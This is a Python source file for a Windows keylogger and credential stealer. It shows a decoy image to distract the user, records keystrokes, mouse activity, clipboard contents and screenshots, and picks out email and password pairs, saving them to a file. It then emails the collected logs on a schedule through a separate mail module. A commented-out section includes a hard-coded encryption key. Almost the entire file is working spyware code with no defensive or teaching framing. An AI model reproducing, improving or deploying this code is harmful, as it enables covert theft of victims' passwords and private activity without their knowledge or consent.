from cryptography.fernet import Fernet
from pynput import mouse
from pynput import keyboard
from os.path import join
from datetime import datetime
import urllib.request
from PIL import Image
import pyautogui
import os
import schedule
import mail
import ctypes
import keyboard as clipboardkeyboard
import win32clipboard
import psutil

'''The with statement down below was used to ensure the file opened will be closed properly without calling close()
The code starts by opening the settings files for the GUI imported in the project'''

with open('setting.txt') as SettingsFile:
    lines = SettingsFile.readlines()  # Returns all lines in the settings file as a list
    image = lines[0].replace("\n", "")
    path = lines[1].replace("\n", "")
    timeToSend = int(lines[2].replace("\n", ""))
    MouseLog = lines[5].replace("\n", "")
    KeyboardLog = lines[6].replace("\n", "")
    ScreenshotLog = lines[7].replace("\n", "")
    emailSent = lines[8].replace("\n", "")
    PasswordLog = lines[9].replace("\n", "")
    DecoyDisplay = lines[10].replace("\n", "")

# TODO: Encryption Method , PRESERVED FOR FUTURE USAGE
# Encrypted_KeyboardLog = "C:/Users/97252/Desktop/Log/Encrypted_KeyboardLog.txt"
#
# files_to_encrypt = [path]
# encrypted_files = [path + Encrypted_KeyboardLog]
# key = "CGSGT35QoI3usquQLXu8z9_Eo1BTABAuHjlIyxNu-_8="
#
# count = 0
#
# for encrypting_file in files_to_encrypt:
#     with open(files_to_encrypt[count], 'rb') as f:
#         data = f.read()
#
#     fernet = Fernet(key)
#     encrypted = fernet.encrypt(data)
#
#     with open(encrypted_files[count],'wb') as f:
#         f.write(encrypted)
#
#     count += 1


if DecoyDisplay == '1':
    urllib.request.urlretrieve(image, "images/Decoy.png")
    img = Image.open("images/Decoy.png")
    img.show()

day = datetime.now().day
month = datetime.now().month
year = datetime.now().year
current_time = day.__str__() + "-" + month.__str__() + "-" + year.__str__()

'''The following statements of try & catch are placed in order to create the directory file that will contain all the logged
data inside of it, In addition another try and except statement have been added to deal with the screenshot folder to
make the log file more organized by saving the screenshots in one file'''
try:
    os.mkdir(path)
except:
    pass
try:
    os.mkdir(path + "/Screenshot")
except:
    pass

schedule.every(timeToSend).minutes.do(mail.sendmail, current_time)

email = ""
password = ""
passSave = False
preEmail = ""

'''Function to deal with the capital letters lock key state , it makes the key logging more organized according to the
state the capslock is'''


def get_capslock_state():
    # WinDLL is a C calling convention which is why ctypes was imported.
    hllDll = ctypes.WinDLL("User32.dll")
    VK_CAPITAL = 0x14
    return hllDll.GetKeyState(VK_CAPITAL)


def copy_clipboard():
    global passSave
    global email
    global password
    global preEmail
    with open(path + "/clipboard.txt", "a") as file:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            file.write(pasted_data + "\n")
            if '@' in pasted_data:
                if preEmail != pasted_data:
                    email = pasted_data
                    savePassword()
            elif passSave:
                password = pasted_data
                savePassword()

        except:
            file.write("Clipboard could be not be copied")


def file_write(key):
    global email
    global password
    global passSave
    key_pressed = str(key)
    key_pressed = key_pressed.replace("'", "")  # Remove the default '' that will be placed for every key log.
    name = current_time + 'Keyboard.txt'
    if key_pressed == 'Key.space':
        key_pressed = ' '
    if key_pressed == 'Key.enter':
        key_pressed = "\n"
        savePassword()
    if key_pressed == "Key.shift":
        key_pressed = ""
    if key_pressed == "Key.shift_r":
        key_pressed = ""
    if key_pressed == "Key.caps_lock":
        key_pressed = ""
    if key_pressed == "Key.alt_l":
        key_pressed = ""
    if key_pressed == "Key.ctrl_l":
        key_pressed = "[Left Control]"
    if key_pressed == "Key.ctrl_r":
        key_pressed = "[Right Control]"
    if key_pressed == 'Key.tab':
        savePassword()
        key_pressed = "\n"

    if clipboardkeyboard.is_pressed('ctrl+c') or clipboardkeyboard.is_pressed('ctrl+v'):
        copy_clipboard()

    if key_pressed == 'Key.backspace':
        with open(join(path, name),
                  'rb+') as file:  # rb+ means the file will be opened for both reading and writing in binary format
            file.seek(-1, os.SEEK_END)
            file.truncate()
        email = email[:-1]
        password = password[:-1]
        key_pressed = ""

    if key_pressed == "Key.alt_gr":
        os._exit(0)

    if 'Key' in key_pressed:
        key_pressed = key_pressed.replace("Key.", "{")
        key_pressed = key_pressed + "}"

    if get_capslock_state():
        key_pressed = key_pressed.upper()

    if passSave:
        password += key_pressed
    else:
        email = email + key_pressed

    with open(join(path, name), 'a') as f:
        f.write(key_pressed)

    if emailSent == '1':
        schedule.run_pending()

    # with open(path + "/processes.txt", "a") as file:
    #     for proc in psutil.process_iter():
    #         try:
    #             processName = proc.name()
    #             processID = proc.pid
    #             file.write(processName)
    #             file.write('<--->')
    #             file.write(str(processID))
    #             file.write("\n")
    #         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
    #             pass


def savePassword():
    if PasswordLog == "1":
        global email
        global password
        global passSave
        global preEmail
        if not password:
            if '@' in email:
                with open(join(path, "emailPassword.txt"), 'a') as f:
                    f.write("email: " + email + "\n")
                    preEmail = email
                    email = ""
                    passSave = True
            else:
                email = ""
        elif passSave:
            with open(join(path, "emailPassword.txt"), 'a') as f:
                password = password.replace('\n', '').replace('[Left Control]', '').replace("\\x16", '').replace(
                    "\\x03", "")
                if len(password) > 0:
                    f.write(" password: " + password + "\n\n\n")
                    password = ""
                    passSave = False
                    if emailSent == '1':
                        mail.sendmail(current_time)


def on_move(x, y):
    name = current_time + 'Mouse.txt'
    with open(join(path, name), 'a') as f:
        f.write('\nPointer moved to {0}'.format(
            (x, y)))
    if emailSent == '1':
        schedule.run_pending()


def on_click(x, y, button, pressed):
    name = current_time + 'Mouse.txt'

    if ScreenshotLog == '1':
        screenshot = pyautogui.screenshot()
        screenshot.save(path + '/Screenshot/s_' + datetime.now().microsecond.__str__() + '.png')

    savePassword()

    with open(join(path, name), 'a') as f:
        f.write('\n{0} at {1}'.format(button, (x, y)))

    if emailSent == '1':
        schedule.run_pending()


def on_scroll(x, y, dx, dy):
    name = current_time + 'Mouse.txt'
    with open(join(path, name), 'a') as f:
        f.write('\nScrolled  dy={0} at {1}'.format(dy, (x, y)))

    if emailSent == '1':
        schedule.run_pending()


if KeyboardLog == '1' and MouseLog == '1':
    with keyboard.Listener(on_press=file_write), mouse.Listener(
            on_move=on_move,
            on_click=on_click,
            on_scroll=on_scroll) as listen:
        listen.join()
elif KeyboardLog == '1':
    with keyboard.Listener(on_press=file_write) as listen:
        listen.join()
elif MouseLog == '1':
    with mouse.Listener(
            on_move=on_move,
            on_click=on_click,
            on_scroll=on_scroll) as listen:
        listen.join()
